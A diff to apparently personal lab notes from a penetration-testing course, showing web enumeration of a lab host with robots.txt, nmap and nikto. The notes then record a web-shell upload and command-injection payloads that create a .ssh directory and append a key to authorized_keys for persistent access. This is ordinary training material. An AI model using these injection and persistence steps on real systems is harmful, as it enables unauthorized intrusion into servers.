@@ -65,6 +65,76 @@ proxychains nmap 192.168.150.245 --script=smb-os-discovery
           |   NetBIOS computer name: O79KCLB6P3TGUKL\x00
           |   Workgroup: WORKGROUP\x00
           |_  System time: 2024-09-17T19:45:11+00:00
+#Close dynamic on .120
+ssh -S /tmp/120 120 -O cancel -D 9050
+
 
 --------------------------------------------------------------DAY 2------------------------------------------------------
+#enumerate robots.txt
+        User-agent: *
+        Allow: /uploads
+        Allow: /chat
+        Allow: /cmdinjection
+        Allow: /java
+        Allow: /path
+        Allow: /webexample
+        Disallow: /cross
+        Disallow: /
+        
+        
+        User-agent: Googlebot
+        Disallow: /
+        
+        
+        User-agent: Baiduspider
+        Disallow: /
+#From Surfing 
+-Can upload file
+#Use Tools to enumerate server 
+nmap --script=http-enum 10.50.28.11 -T5 -vvvv
+        22/tcp   open   ssh           syn-ack
+        80/tcp   open   http          syn-ack
+        | http-enum: 
+        |   /robots.txt: Robots file
+        |   /java/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+        |   /path/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+        |_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+        3389/tcp closed ms-wbt-server conn-refused
+        8080/tcp closed http-proxy    conn-refused
+        9999/tcp closed abyss         conn-refused
 
+nikto v -h 10.50.28.11
+        OSVDB-3268: /uploads/: Directory indexing found.
+        + File/dir '/uploads/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+        + OSVDB-3268: /chat/: Directory indexing found.
+        + File/dir '/chat/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+        + OSVDB-3268: /cmdinjection/: Directory indexing found.
+        + File/dir '/cmdinjection/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+        + OSVDB-3268: /java/: Directory indexing found.
+        + File/dir '/java/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+        + OSVDB-3268: /path/: Directory indexing found.
+        + File/dir '/path/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+        + OSVDB-3268: /webexample/: Directory indexing found.
+        + File/dir '/webexample/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+        + OSVDB-3268: /cross/: Directory indexing found.
+        + File/dir '/cross/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+        + File/dir '/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+        + "robots.txt" contains 10 entries which should be manually viewed.
+        + Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+        + OSVDB-3092: /java/: This might be interesting...
+        + OSVDB-3233: /icons/README: Apache default file found.
+#Navigate all paths found 
+/uploads/mal.php: Allows commands to be run by user www-data
+#Main Page allows file upload, uploaded web shell allgood.php to /uploads 
+#/cmdinjection is vulnerable to command injection 
+#Create ssh keys 
+ssh-keygen
+#Find Home Dir on web machine 
+; ls -la /var/www
+# HTML Directory is where web is served from
+#.ssh dosent exist 
+; mkdir /var/www/.ssh
+# Put ssh public key into /var/www/.ssh/authorized_keys
+; echo "; MIIEowIBAAKCAQEAp...FKBkhbB+mcAc138dUCCFdt" >> /var/www/.ssh/authorized_keys
+        
+        
